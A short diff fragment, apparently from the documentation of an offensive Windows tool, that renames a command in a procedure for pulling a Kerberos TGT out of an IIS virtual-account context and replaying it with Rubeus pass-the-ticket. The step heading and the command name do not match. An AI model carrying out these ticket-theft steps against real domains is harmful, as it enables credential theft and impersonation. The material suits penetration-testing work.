@@ -20,7 +20,7 @@ When a web application runs under an **IIS virtual account** (e.g. `IIS APPPOOL\
    └─ Copy Session Key (Base64)
 
 3. Run TGTExtractor.exe on attacker machine:
-   Cert-Potato.exe /apreq:<AP-REQ> /session_key:<key> /output:base64
+   TGtDelegation.exe /apreq:<AP-REQ> /session_key:<key> /output:base64
 
 4. Use extracted TGT:
    └─ Windows: Rubeus.exe ptt /ticket:<base64_encoded_ticket>
